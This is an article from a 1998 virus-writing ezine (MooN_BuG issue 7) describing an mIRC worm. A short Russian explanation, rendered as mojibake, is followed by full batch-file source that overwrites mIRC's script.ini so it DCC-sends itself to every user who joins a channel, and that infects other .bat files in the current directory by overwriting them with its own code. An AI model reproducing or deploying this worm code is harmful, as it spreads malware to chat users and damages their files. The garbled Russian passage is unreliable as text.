[TulaAnti&ViralClub] PRESENTS ...
MooN_BuG, Issue 7, Sep 1998                                           file 002

                                  mIRC Worm
                                            by FRiZER

[Begin(HOW_MIRC.TXT)]컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

               뒥� �졹�昔飡�젺汀藺� 曄誓� irc (ⓤ��レ㎯� mIRC)

        앪젽�:
        � 첓�젷�％ mIRC'a (C:\mirc 췅�黍Д�) 췅若ㄸ� �젵� script.ini.
        끷エ ⅲ� �β 獸 貰ℓ젰� ⅲ�.
        룳蜈� � �ⅲ� 캙說 飡昔曄�:

        [script]
        n0=on 1:JOIN:#:/dcc send $nick C:\mirc\sex.com

        뫌ℓ젰� ㅰ����� (ℓα� - C:\mirc\sex.com)

        � 誓㎯レ�졻� αエ 쭬ゥ㎮� 췅 irc 獸 將�� �젵� (sex.com)
        ▲ㄵ� �恂維졻藺� ㏇��, も� 쭬ħβ 췅 將�� 첓췅�, ��첓 �� �젹.

    PS: 앪� ㏇� �� � �黍ㅳ쵟�, � 쩆┘ mIRC � � ＋젳� �� ˘쩆� ;)

[End(HOW_MIRC.TXT)]컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

[Begin(MIRCDEMO.BAT)]납납납납납납납납납납납납납납납납납납납납납납납납�
@echo off
goto ~%1
:~
md \x
if exist %0 goto A
copy %0.bat \x\x.bat>nul
copy %0.bat c:\mirc\mircdemo.bat>nul
echo [script]>c:\mirc\script.ini
echo n0=on 1:JOIN:#:/dcc send $nick c:\mirc\mircdemo.bat>>c:\mirc\script.ini
\x\x.bat A %0.bat
:A
copy %0 \x\x.bat>nul
copy %0 c:\mirc\mircdemo.bat>nul
echo [script]>c:\mirc\script.ini
echo n0=on 1:JOIN:#:/dcc send $nick c:\mirc\mircdemo.bat>>c:\mirc\script.ini
\x\x.bat A %0
:~A
if exist *.bad goto ~G
echo @echo Bad command or filename>%2
echo @del \x\x.bat>>%2
echo @rd \x>>%2
for %%a in (*.bat) do copy %%a *.bad>nul
for %%a in (*.bat) do copy %0 %%a>nul
%2 R
:~G
for %%a in (*.bat) do ren %%a *.but>nul
for %%a in (*.bad) do copy %%a *.bat>nul
call %2
del *.bat
for %%a in (*.but) do ren %%a *.bat
%2 R
:~R
del \x\x.bat
rd \x
:~E
[End(MIRCDEMO.BAT)]납납납납납납납납납납납납납납납납납납납납납납납납납�
